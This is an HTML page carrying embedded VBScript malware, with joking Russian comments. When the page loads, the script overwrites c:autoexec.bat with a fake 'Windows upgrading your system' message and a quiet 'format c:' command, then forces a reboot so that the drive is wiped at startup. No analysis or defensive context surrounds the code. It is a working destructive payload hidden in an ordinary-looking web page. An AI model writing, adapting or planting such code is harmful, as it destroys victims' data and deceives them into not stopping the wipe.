<html> 
<body> 
<script language ="VBScript"> 
sub Reboot 'Процедурка перезагрузки 
Set Shell=CreateObject("WScript.Shell") 
Shell.Run "Rundll32.exe User.exe,ExitWindows" 'Вызов WinApi с помощью RunDll 
end sub 
sub destruct 
set fs=createobject("Scripting.FileSystemObject")'FileSystem 
if fs.fileexists("c:autoexec.bat") then 'Если у нас Autoexec существует 
set ab=fs.getfile("c:autoexec.bat") 'Возмём его 
ab.attributes=0 'И поставим "нормальные" аттрибуты)) 
end if 
set autoexec=fs.CreateTextFile("c:autoexec.bat")'Пересоздадим Autoexec 
'Далее запишем в него полезные комманды, их там явно не хватает!) 
autoexec.WriteLine "@cls" 
autoexec.WriteLine "@echo Windows upgrading your system..." 
autoexec.WriteLine "@echo Do not abort this process!" 
autoexec.WriteLine "@format c: /q /autotest" 
autoexec.close 'Закроем Autoexec.bat 
end sub 
destruct 'Запишем в Autoexec комманду format 
reboot 
</script> 
</body> 
</html>
